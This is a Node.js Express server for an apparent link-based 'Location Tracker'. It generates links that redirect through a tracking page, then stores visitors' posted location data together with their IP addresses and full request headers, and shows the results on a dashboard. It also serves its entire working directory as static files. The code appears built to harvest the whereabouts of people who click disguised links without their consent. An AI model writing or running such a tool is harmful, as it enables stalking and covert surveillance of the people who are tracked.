const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// In-memory storage (use database in production)
let trackingData = {
    links: [],
    locations: []
};

// Serve static files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint to save location data
app.post('/api/save-location', (req, res) => {
    const locationData = req.body;
    
    // Add IP address and additional metadata
    locationData.ipAddress = req.ip;
    locationData.headers = req.headers;
    locationData.id = Date.now().toString();
    
    // Save location data
    trackingData.locations.push(locationData);
    
    // Update click count for the tracking link
    const link = trackingData.links.find(l => l.id === locationData.trackingId);
    if (link) {
        link.clicks = (link.clicks || 0) + 1;
    }
    
    console.log('Location saved:', locationData);
    
    res.json({ success: true, id: locationData.id });
});

// API endpoint for dashboard data
app.get('/api/dashboard', (req, res) => {
    const stats = {
        totalLinks: trackingData.links.length,
        totalClicks: trackingData.locations.length,
        locationsCount: trackingData.locations.length,
        locations: trackingData.locations.slice(-20).reverse() // Last 20 locations
    };
    
    res.json(stats);
});

// API endpoint to create tracking link
app.post('/api/create-link', (req, res) => {
    const linkData = req.body;
    linkData.id = Date.now().toString(36) + Math.random().toString(36).substr(2);
    linkData.createdAt = new Date().toISOString();
    linkData.clicks = 0;
    
    trackingData.links.push(linkData);
    
    const trackingUrl = `${req.protocol}://${req.get('host')}/track.html?id=${linkData.id}&redirect=${encodeURIComponent(linkData.redirectUrl)}`;
    
    res.json({ success: true, trackingUrl, linkData });
});

// Start server
app.listen(PORT, () => {
    console.log(`Location Tracker server running on http://localhost:${PORT}`);
});
